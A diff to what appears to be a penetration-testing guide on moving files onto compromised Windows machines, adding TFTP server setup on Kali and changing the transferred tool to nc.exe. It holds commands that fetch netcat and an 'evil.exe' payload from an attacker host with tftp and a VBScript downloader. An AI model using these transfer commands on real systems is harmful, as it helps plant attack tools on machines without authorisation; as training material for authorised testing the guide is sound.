@@ -27,9 +27,9 @@ Of course you need to have a ftp-server configured with the user asshat and the 
 
 ## TFTP
 
-Works by default on:  
+Works by default on:
 
-**Windows XP**  
+**Windows XP**
 
 **Windows 2003**
 
@@ -38,12 +38,17 @@ A TFTP client is installed by default on windows machines up to Windows XP and W
 Kali has a TFTP server build in.  
 You can server up some files with it like this
 
+Setup TFTP In kali machine :
+
 ```
+mkdir tftp
 atftpd --daemon --port 69 /tftp
+
+
 /etc/init.d/atftpd restart
 ```
 
-Now you can put stuff in `/srv/tftp` and it will be served. Remember that TFTP used UDP. So if you run `netstat` it will not show it as listening.
+Now you can put stuff in `/tftp` and it will be served. Remember that TFTP used UDP. So if you run `netstat` it will not show it as listening.
 
 You can see it running like this
 
@@ -54,7 +59,7 @@ netstat -a -p UDP | grep udp
 So now you can upload and download whatever from the windows-machine like this
 
 ```
-tftp -i 192.160.1.101 GET wget.exe
+tftp -i 192.160.1.101 GET nc.exe
 ```
 
 If you like to test that the tftp-server is working you can test it from Linux, I don't think it has a non-interactive way.
@@ -105,6 +110,7 @@ echo ts.Close >> wget.vbs
 ```
 
 You then execute the script like this:
+
 ```
 cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
 ```
